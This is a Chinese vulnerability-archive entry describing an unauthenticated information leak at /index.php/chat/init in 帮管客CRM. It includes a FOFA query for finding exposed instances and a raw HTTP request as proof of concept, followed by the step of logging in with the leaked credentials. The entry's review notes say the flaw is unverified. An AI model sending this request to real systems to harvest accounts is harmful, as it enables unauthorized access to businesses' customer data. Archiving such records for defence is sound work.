---
source: "wy876 漏洞文库"
title: "帮管客CRM chat/init信息泄露声称"
product: "帮管客CRM"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知"
prerequisites: "匿名请求示例"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/mc3s6wuyw1qn9n0t"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E5%B8%AE%E7%AE%A1%E5%AE%A2CRM/%E5%B8%AE%E7%AE%A1%E5%AE%A2CRMinit%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md"
fofa: "app=\"帮管客-CRM\""
id: "vw-c7d0e126b2aeef17055924ad"
entity_id: "ve-c7d0e126b2aeef17055924ad"
schema_version: "1"
---

# 帮管客CRM chat/init信息泄露声称

## 条目说明

- 对象与具体问题：帮管客CRM；chat/init信息泄露声称
- 版本、配置及部署条件：版本未知
- 认证与权限前提：匿名请求示例
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 无响应字段，无法确定实际含账号明文/哈希或是否能登录
- 使用泄露账号密码登录为结论但未展示认证验证；最小化敏感数据证据
- 与上传/SQLi独立缺陷，补厂商修复和版本

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
帮管客CRM是一款集客户档案、销售记录、业务往来等功能于一体的客户管理系统。帮管客CRM客户管理系统，客户管理，从未如此简单，一个平台满足企业全方位的销售跟进、智能化服务管理、高效的沟通协同、图表化.帮管客CRM init 信息泄露漏洞

## 二、影响版本
+ 帮管客CRM

## 三、资产测绘
+ fofa`app="帮管客-CRM"`
+ 特征


## 四、漏洞复现
```http
GET /index.php/chat/init HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close
```


使用泄漏的账号密码登陆系统


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/mc3s6wuyw1qn9n0t>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
